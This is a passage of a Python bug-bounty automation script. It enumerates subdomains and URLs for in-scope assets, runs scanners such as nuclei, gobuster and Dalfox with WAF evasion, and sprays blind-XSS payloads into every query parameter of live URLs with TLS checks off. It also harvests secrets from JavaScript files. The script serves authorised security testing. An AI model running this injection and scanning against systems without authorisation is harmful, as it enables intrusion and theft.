        print(f"{Colors.WARNING}xss_scan: file {alive_query_file} missing, skipping{Colors.ENDC}")
        return

    print(f"{Colors.OKBLUE}{Colors.BOLD}Running Dalfox scan on URLs for {domain}...{Colors.ENDC}")

    dalfox_cmd = f"dalfox file {alive_query_file} --output {output_file} --delay 200 --worker 10 --waf-evasion --skip-mining-all --skip-mining-all --skip-bav {hdr()}"
    run_cmd(dalfox_cmd, cwd=folder, allow_empty_stdout=True)

    # Step 2: blind xss
    print(f"{Colors.OKBLUE}{Colors.BOLD}Injecting Blind XSS payloads...{Colors.ENDC}")
    with (folder / alive_query_file).open("r") as f:
        for line in f:
            parsed = urlparse(line)
            query = parse_qs(parsed.query)
            injected_query = {k: xss_hunter_payload for k in query}
            new_query = urlencode(injected_query, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))

            try:
                thisHeaders = headers.copy()
                if extra_header:
                    thisHeaders[extra_header.split(':')[0]] = extra_header.split(':')[1][1:]
                response = requests.get(new_url, headers=thisHeaders, timeout=4, verify=False)
                print(f"{Colors.OKBLUE}Sent blind XSS payload to: {new_url} [Status: {response.status_code}]{Colors.ENDC}")
            except requests.RequestException as e:
                print(f"{Colors.WARNING}Request failed for {new_url}: {e}{Colors.ENDC}")

    print(f"{Colors.OKCYAN}Blind XSS payloads sent. Monitor your XSS Hunter dashboard.{Colors.ENDC}")
    print(f"{Colors.OKGREEN}XSS Scan completed. Results saved to:{Colors.ENDC}")
    print(f"  - {output_file}   (Reflected/Stored XSS)")
    print(f"  - {blind_file}    (Blind XSS URLs)")

    return output_file

def run_gau(folder: Path, domain: str):
    print(f"{Colors.HEADER}{Colors.BOLD}Running gau for {domain}{Colors.ENDC}")
    urls_file = filenames['gau'].format(domain)
    alive_subs_file = filenames['alive_subs'].format(domain)
    if not (folder / alive_subs_file).exists():
        print(f"{Colors.WARNING}gau_only: file {alive_subs_file} missing, skipping{Colors.ENDC}")
        return

    if (folder / alive_subs_file).stat().st_size > 0 and not (folder / urls_file).exists():
        run_cmd(f"cat {alive_subs_file} | gau > {urls_file}", cwd=folder)
        return folder / urls_file
    else:
        print(f"{Colors.WARNING}gau_only: No alive subdomains found in {alive_subs_file}, skipping gau{Colors.ENDC}")
        return

def run_katana(folder: Path, domain: str, single_domain = False):
    print(f"{Colors.HEADER}{Colors.BOLD}Running katana for {domain}{Colors.ENDC}")
    katana_file = filenames['katana'].format(domain)
    alive_subs_file = filenames['alive_subs'].format(domain)
    if not (folder / alive_subs_file).exists():
        print(f"{Colors.WARNING}katana_only: file {alive_subs_file} missing, skipping{Colors.ENDC}")
        return

    if (folder / alive_subs_file).stat().st_size > 0 and not (folder / katana_file).exists():
        katana_base = f"katana -list {alive_subs_file} -o {katana_file} -fs fqdn -d 3 -jc -kf all -silent{hdr()}"
        try:
            run_cmd(f"timeout 30m {katana_base}", cwd=folder, allow_empty_stdout=True)

        except RuntimeError as e:
            print(f"{Colors.WARNING}Katana failed or timed out: {e}{Colors.ENDC}")
            if not (folder / katana_file).exists():
                open(folder / katana_file, "w").close()
        return folder / katana_file
    else:
        print(f"{Colors.WARNING}katana_only: No alive subdomains found in {alive_subs_file}, skipping katana{Colors.ENDC}")
        return

def httpx_tech_detect(folder: Path, domain: str):
    httpx_tech_file = filenames['httpx_tech'].format(domain)
    alive_subs_file = filenames['alive_subs'].format(domain)
    print(folder / alive_subs_file)
    if not (folder / alive_subs_file).exists():
        print(f"{Colors.WARNING}httpx_tech_detect: file {alive_subs_file} missing, skipping{Colors.ENDC}")
        return

    if (folder / alive_subs_file).stat().st_size > 0 and not (folder / httpx_tech_file).exists():
        httpx_cmd = f"httpx -hc -cl -tech-detect -title {hdr()}"
        run_cmd(f"cat {alive_subs_file} | {httpx_cmd} > {httpx_tech_file}", cwd=folder)
        return folder / httpx_tech_file
    else:
        print(f"{Colors.WARNING}httpx_tech_detect: No alive subdomains found in {alive_subs_file}, skipping httpx tech detect{Colors.ENDC}")
        return

def pretty_httpx(folder: Path, domain: str):
    print(f"{Colors.HEADER}{Colors.BOLD}Generating pretty_httpx for {domain}{Colors.ENDC}")
    subs_file = filenames['merged_subdomains'].format(domain)
    pretty_httpx = filenames['pretty_httpx'].format(domain)

    if not (folder / pretty_httpx).exists() and (folder / subs_file).exists():
        run_cmd(
            f"cat {subs_file} | httpx -silent -title -status-code -content-length -tech-detect -follow-redirects -location -o {pretty_httpx}{hdr()}",
            cwd=folder
        )

def sort_all_urls(folder: Path, domain: str):
    print(f"{Colors.HEADER}{Colors.BOLD}Sorting URLs for {domain}{Colors.ENDC}")
    input_file = filenames['alive_urls'].format(domain)
    output_file = filenames['sorted_urls'].format(domain)

    if not (folder / input_file).exists():
        print(f"{Colors.WARNING}sort_urls: input file {input_file} missing, skipping{Colors.ENDC}")
        return
    if (folder / output_file).exists():
        print(f"{Colors.OKGREEN}sort_urls: output file {output_file} already exists, skipping{Colors.ENDC}")
        return
    
    sorted_dir = folder / "sorted_urls"
    if not (folder / "sorted_urls.txt").exists():
        try:
            sort_urls(folder / input_file, sorted_dir)
        except Exception as e:
            print(f"{Colors.WARNING}sort_urls failed: {e}{Colors.ENDC}")

def process_wildcard(domain, base_dir, processed_urls = set()):
    print(f"{Colors.HEADER}{Colors.BOLD}Processing: {domain}{Colors.ENDC}")
    clean_domain = domain.replace("*.", "").strip()
    try:
        ascii_domain = idna.encode(clean_domain).decode('utf-8')
    except Exception as e:
        print(f"{Colors.WARNING}IDNA encoding failed for {clean_domain}: {e}. Using original domain.{Colors.ENDC}")
        ascii_domain = clean_domain

    folder = base_dir / ascii_domain
    folder.mkdir(parents=True, exist_ok=True)

    subs_file = f"{ascii_domain}.txt"
    alive_file = "alive_urls"
    pretty_httpx = "pretty_httpx.txt"

    # 1: findomain (creates subs file automatically with -o)
    findomain_scan(folder, ascii_domain)

    # 2: amass merge
    amass_scan(folder, ascii_domain)
    
    # 2b: merge findomain + amass
    merge_subdomains(folder, ascii_domain)

    # Step 3: httpx tech detect and alive
    httpx_tech_detect(folder, ascii_domain)

    # 3: gau
    run_gau(folder, ascii_domain)

    # 4: katana
    run_katana(folder, ascii_domain)

    # 5: Filter unique paths and domains that are not the base_domain variable and merge
    merge_httpx_files(folder, ascii_domain)    

    # 7: JS analyzsis
    try:
        js_stats = analyze_js_files(folder, ascii_domain)
        if js_stats.get("dir"):
            print(f"{Colors.OKGREEN}JS analysis found {js_stats['secrets_found']} secrets and {js_stats['endpoints_extracted']} endpoints in {js_stats['js_urls_checked']} JS files.{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.WARNING}JS analysis failed: {e}{Colors.ENDC}")

    # 8: classify/sort
    sort_all_urls(folder, ascii_domain)

    # 9: pretty httpx per subdomain (tech + status)
    pretty_httpx(folder, ascii_domain)

    # 10: light sensitive endpoint enumeration (optional, ignore failures)
    try:
        if GOBUSTER_WORDLIST and not SKIP_GOBUSTER:
            enumerate_domains(folder / pretty_httpx, folder, GOBUSTER_THREADS, GOBUSTER_PROXY, GOBUSTER_WORDLIST)
    except Exception as e:
        print(f"{Colors.WARNING}Internal gobuster enumeration failed: {e}{Colors.ENDC}")

    print(f"{Colors.OKGREEN}Processing for {domain} completed. Temp results in {folder}{Colors.ENDC}")

    run_cmd(f"find . -size 0 -print -delete", cwd=folder, allow_empty_stdout=True)

def process_url(url, base_dir):
    print(f"{Colors.HEADER}{Colors.BOLD}Processing URL: {url}{Colors.ENDC}")
    folder = base_dir / "urls"
    folder.mkdir(parents=True, exist_ok=True)

    if "http" in url.lower() or "/" in url or "'" in url:
        print(f"{Colors.FAIL}Dangerous input. Please no protocols in the input{Colors.ENDC}")
        return

    # Step 0: small hack to create alive_subs_file
    alive_subs_file = folder / filenames['alive_subs'].format(url)
    print(alive_subs_file)
    if not alive_subs_file.exists():
        with open(alive_subs_file, "w") as f:
            f.write(f"{url}\n")

    # Step 1: httpx tech detect and alive
    httpx_tech_detect(folder, url)

    # Step 2: gau
    run_gau(folder, url)

    # Step 3: katana
    run_katana(folder, url, single_domain=True)

    # Step 4: merge httpx files
    merge_httpx_files(folder, url)

    # Step 5: nuclei scan based on techs
    nuclei_scan(folder, url)

    # Step 6: xss scan if applicable
    create_query_only_file(folder, url)
    if (folder / filenames['query_only'].format(url)).exists() and (folder / filenames['query_only'].format(url)).stat().st_size > 0:
        xss_scan(folder, url)
    
def parse_pretty_httpx(path: Path):
    results = []
    if not path.exists():
        return results
    # Example line: https://sub.example.com [301] [len:0] [cloudflare] [Title: ...] => https://www.example.com/
    for line in path.read_text(errors="ignore").splitlines():
        if not line.strip():
            continue
        entry = {
            "raw": line,
            "url": None,
            "status": None,
            "length": None,
            "tech": [],
            "title": "",
            "location": None
        }
        parts = line.split()
        entry["url"] = parts[0]
        status_match = re.search(r"\[(\d{3})\]", line)
        if status_match:
            entry["status"] = int(status_match.group(1))
        length_match = re.search(r"\[len:(\d+)\]", line, re.I)
        if length_match:
            entry["length"] = int(length_match.group(1))
        # tech blocks appear as [Apache],[nginx] etc.
        tech_matches = re.findall(r"\[([A-Za-z0-9 ._-]+)\]", line)
        # First bracket usually status, second maybe len, rest tech/title chain; simplistic filter
        filtered = []
        for t in tech_matches:
            if t.isdigit() or t.startswith("len:"):
                continue
            if t.lower().startswith("title"):
                entry["title"] = t
            elif t.lower().startswith("location:"):
                entry["location"] = t.split(":",1)[1].strip()
            else:
                filtered.append(t)
        entry["tech"] = filtered
        # extract '=> location' fallback
        if entry["location"] is None:
            arrow_loc = re.search(r"=>\s*(\S+)", line)
            if arrow_loc:
                entry["location"] = arrow_loc.group(1)
        results.append(entry)
    return results

def analyze_domain(domain_dir: Path):
    domain = domain_dir.name
    subs_file = domain_dir / f"{domain}.txt"
    urls_file = domain_dir / "urls"
    alive_file = domain_dir / "alive_urls"
    merged_urls_file = domain_dir / "all_urls"
    pretty_httpx = domain_dir / "pretty_httpx.txt"
    sorted_dir = domain_dir / "sorted_urls"

    subs_count = sum(1 for _ in open(subs_file)) if subs_file.exists() else 0
    alive_count = sum(1 for _ in open(alive_file, 'rb')) if alive_file.exists() else 0
    merged_count = sum(1 for _ in open(merged_urls_file, 'rb')) if merged_urls_file.exists() else 0

    httpx_entries = parse_pretty_httpx(pretty_httpx)
    redirect_only_hosts = []
    live_hosts = []
    host_statuses = {}
    for e in httpx_entries:
        host = e["url"].split("//",1)[-1].split("/",1)[0]
        host_statuses.setdefault(host, []).append(e["status"])
    for host, statuses in host_statuses.items():
        if all(s in REDIRECT_CODES for s in statuses):
            redirect_only_hosts.append(host)
        else:
            live_hosts.append(host)

    # Collect interesting pattern counts from merged_urls
    interesting_patterns = {
        "login": r"login",
        "admin": r"admin",
        "config": r"config",
        "token": r"token",
        "session": r"session",
        "auth": r"auth",
        "debug": r"debug",
    }
    pattern_hits = {k:0 for k in interesting_patterns}
    if merged_urls_file.exists():
        with open(merged_urls_file) as f:
            for line in f:
                low = line.lower()
                for k, pat in interesting_patterns.items():
                    if pat in low:
                        pattern_hits[k] += 1

    # Count sorted buckets
    sorted_counts = {}
    if sorted_dir.exists():
        for f in sorted_dir.glob("*.txt"):
            try:
                c = sum(1 for _ in open(f))
                sorted_counts[f.name] = c
            except:
                pass

    score = 0
    score += min(subs_count,50)/50 * 2
    score += min(alive_count,500)/500 * 3
    score += sum(1 for v in pattern_hits.values() if v>0) * 2
    score += (len(live_hosts) - len(redirect_only_hosts)) * 0.2
    score = round(score,2)

    # JS analysis stats
    js_dir = domain_dir / "js_analysis"
    js_stats = {"js_urls_checked": 0, "secrets_found": 0, "endpoints_extracted": 0}
    if js_dir.exists():
        secrets_file = js_dir / "secrets.json"
        endpoints_file = js_dir / "endpoints.json"
        if secrets_file.exists():
            with open(secrets_file) as f:
                data = json.load(f)
                js_stats["secrets_found"] = len(data)
        if endpoints_file.exists():
            with open(endpoints_file) as f:
                data = json.load(f)
                js_stats["endpoints_extracted"] = len(data)
        js_stats["js_urls_checked"] = len(list(js_dir.glob("js_*.js")))
        # Count sourcemaps if any
        js_stats["sourcemaps_downloaded"] = sum(1 for d in js_dir.glob("unmapped_*") if d.is_dir())

    # Add to score (optional)
    if js_stats["secrets_found"] > 0:
        score += 3
    if js_stats["endpoints_extracted"] > 0:
        score += 1


    return {
        "domain": domain,
        "subdomains_total": subs_count,
        "alive_urls": alive_count,
        "merged_urls": merged_count,
        "unique_hosts_live": len(live_hosts),
        "unique_hosts_redirect_only": len(redirect_only_hosts),
        "redirect_only_hosts_sample": redirect_only_hosts[:10],
        "interesting_pattern_counts": pattern_hits,
        "sorted_category_counts": sorted_counts,
        "js_analysis": js_stats,
        "risk_score": score
    }

def generate_reports(run_dir: Path):
    report_items = []
    for d in run_dir.iterdir():
        if d.is_dir() and (d / f"{d.name}.txt").exists():
            try:
                print(d)
                report_items.append(analyze_domain(d))
            except Exception as e:
                print(f"{Colors.WARNING}Report analysis failed for {d.name}: {e}{Colors.ENDC}")
                traceback.print_exc()

    report_items.sort(key=lambda x: x["risk_score"], reverse=True)
    summary = {
        "run_directory": str(run_dir),
        "generated_at": datetime.datetime.utcnow().isoformat()+"Z",
        "domains_processed": len(report_items),
        "top_domain": report_items[0]["domain"] if report_items else None
    }
    full = {"summary": summary, "domains": report_items}

    # Write JSON
    (run_dir / "report.json").write_text(json.dumps(full, indent=2))
    # Write concise text report
    lines = []
    lines.append(f"Bug Bounty Enumeration Report ({summary['generated_at']})")
    lines.append(f"Run directory: {run_dir}")
    lines.append(f"Domains processed: {summary['domains_processed']}")
    lines.append("")
    for item in report_items:
        lines.append(f"== {item['domain']} ==")
        lines.append(f" Subdomains: {item['subdomains_total']} | Alive URLs: {item['alive_urls']} | Merged URLs: {item['merged_urls']}")
        lines.append(f" Live Hosts: {item['unique_hosts_live']} | Redirect-only Hosts: {item['unique_hosts_redirect_only']}")
        if item['redirect_only_hosts_sample']:
            lines.append(f"  Redirect-only sample: {', '.join(item['redirect_only_hosts_sample'])}")
        if item.get("js_analysis"):
            js = item["js_analysis"]
            lines.append(f" JS: Checked {js['js_urls_checked']} files | Secrets: {js['secrets_found']} | Endpoints: {js['endpoints_extracted']}")

        ipats = {k:v for k,v in item['interesting_pattern_counts'].items() if v>0}
        if ipats:
            lines.append(" Interesting patterns: " + ", ".join(f"{k}:{v}" for k,v in ipats.items()))
        lines.append(f" Risk Score: {item['risk_score']}")
        lines.append("")
    (run_dir / "report.txt").write_text("\n".join(lines))
    print(f"{Colors.OKCYAN}{Colors.BOLD}Reports written to {run_dir}/report.json and report.txt{Colors.ENDC}")

def main():
    global extra_header
    global GOBUSTER_THREADS, GOBUSTER_PROXY, GOBUSTER_WORDLIST, SKIP_GOBUSTER
    parser = argparse.ArgumentParser(description="Bug bounty wildcard automation script")
    parser.add_argument("--json", default="assets.json", help="Path to assets JSON file")
    parser.add_argument("--header", default=None, help="Optional program header (e.g. auth cookie)")
    parser.add_argument("--workers", type=int, default=3, help="Concurrent domains")
    parser.add_argument("--gobuster-threads", type=int, default=2, help="Threads for gobuster (enumeration phase)")
    parser.add_argument("--gobuster-proxy", default=None, help="Optional proxy for gobuster (e.g. http://localhost:1340)")
    parser.add_argument("--gobuster-wordlist", default=GOBUSTER_WORDLIST, help="Wordlist for gobuster directory enumeration")
    parser.add_argument("--skip-gobuster", action="store_true", help="Skip gobuster enumeration phase")
    parser.add_argument("--use-existing-dir", default=None, help="Use an existing run directory instead of creating a new temp one")
    parser.add_argument("--specific-domain", default=None, help="For testing: process only this specific domain from the JSON")
    parser.add_argument("--only-urls", action="store_true", help="Process only URLs from the JSON, skip wildcards")
    parser.add_argument("--only-wildcards", action="store_true")
    parser.add_argument("--dry-run", action="store_true", help="Dry run mode, do not execute commands")
    args = parser.parse_args()

    if args.use_existing_dir:
        run_dir = Path(args.use_existing_dir)
        if not run_dir.exists() or not run_dir.is_dir():
            print(f"{Colors.FAIL}Provided existing directory does not exist or is not a directory: {run_dir}{Colors.ENDC}")
            sys.exit(1)
        print(f"{Colors.OKCYAN}Using existing run directory: {run_dir}{Colors.ENDC}")
    else:
        output_root = Path("output")
        output_root.mkdir(exist_ok=True)

        run_dir = Path(tempfile.mkdtemp(prefix="bounty_run_", dir=str(output_root)))

    print(f"{Colors.OKCYAN}Working directory: {run_dir}{Colors.ENDC}")

    if args.header:
        extra_header = args.header

    GOBUSTER_THREADS = args.gobuster_threads
    GOBUSTER_PROXY = args.gobuster_proxy
    GOBUSTER_WORDLIST = args.gobuster_wordlist

    try:
        with open(args.json, "r") as f:
            data = json.load(f)
    except FileNotFoundError:
        print(f'{Colors.FAIL}Please provide an existing JSON assets file{Colors.ENDC}')
        return
    
    domains = [
        entry.get("Asset")
        for entry in data
        if entry.get("Type") == "Wildcard"
        and entry.get("Coverage") == "In scope"
        and entry.get("Asset")
    ]

    urls = [
        entry.get("Asset")
        for entry in data
        if entry.get("Type") == "URL"
        and entry.get("Coverage") == "In scope"
        and entry.get("Asset")
    ]

    if args.dry_run:
        print(f'{Colors.FAIL}DRY RUN!{Colors.ENDC}')
        return
    
    SKIP_GOBUSTER = args.skip_gobuster
    if not args.only_wildcards:
        with ThreadPoolExecutor(max_workers=args.workers) as executor:
            futures = {executor.submit(process_url, u, run_dir): u for u in urls if (not args.specific_domain) or (u == args.specific_domain)}
            for fut in as_completed(futures):
                url = futures[fut]
                try:
                    fut.result()
                except Exception as e:
                    print(f"{Colors.FAIL}{Colors.BOLD}URL {url} failed: {e}{Colors.ENDC}")
                    traceback.print_exc()

    if not args.only_urls:
        if args.only_wildcards:
            processed_urls = set()
        else:
            processed_urls = set(urls)
        with ThreadPoolExecutor(max_workers=args.workers) as executor:
            futures = {executor.submit(process_wildcard, d, run_dir, processed_urls): d for d in domains if (not args.specific_domain) or (d == args.specific_domain)}
            for fut in as_completed(futures):
                dom = futures[fut]
                try:
                    fut.result()
                except Exception as e:
                    print(f"{Colors.FAIL}{Colors.BOLD}Domain {dom} failed: {e}{Colors.ENDC}")

    # After all domains processed, generate aggregated reports
    print(f'{Colors.HEADER}{Colors.BOLD}Generating reports...{Colors.ENDC}')
    generate_reports(run_dir)

    print(f"{Colors.OKGREEN}All done. Review report.txt for triage guidance.{Colors.ENDC}")


if __name__ == "__main__":
    main()
